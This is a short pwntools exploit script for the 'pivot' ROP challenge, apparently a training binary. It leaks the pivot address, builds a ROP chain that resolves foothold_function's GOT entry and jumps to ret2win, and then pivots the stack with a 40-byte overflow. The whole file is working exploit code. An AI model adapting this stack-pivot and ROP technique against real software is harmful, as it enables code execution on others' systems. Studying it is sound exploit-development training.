from pwn import *

#context.log_level = 'debug'
p = process('./pivot')
elf = ELF('./pivot')
lib_elf = ELF('./libpivot.so')

pop_rax = 0x0000000000400b00
mov_rax_raxp = 0x0000000000400b05
pop_rbp = 0x0000000000400900
add_rax_rbp = 0x0000000000400b09
call_rax = 0x000000000040098e
xchg_rax_rsp = 0x0000000000400b02

func_plt = elf.plt['foothold_function']
func_got = elf.got['foothold_function']
foothold_index = lib_elf.symbols['foothold_function']
ret2win_index = lib_elf.symbols['ret2win']
offset = int(ret2win_index-foothold_index)

p.recvuntil("place to pivot: ")
fake_rbp = int(p.recv(14),16)
payload1 = p64(func_plt)
payload1 += p64(pop_rax)
payload1 += p64(func_got)
payload1 += p64(mov_rax_raxp)
payload1 += p64(pop_rbp)
payload1 += p64(offset)
payload1 += p64(add_rax_rbp)
payload1 += p64(call_rax)

p.recvuntil('Send your second chain now and it will land there')
p.sendline(payload1)

payload2 = 'a'*40
payload2 += p64(pop_rax)
payload2 += p64(fake_rbp)
payload2 += p64(xchg_rax_rsp)
p.recvuntil('Now kindly send your stack smash')
p.sendline(payload2)

p.interactive()
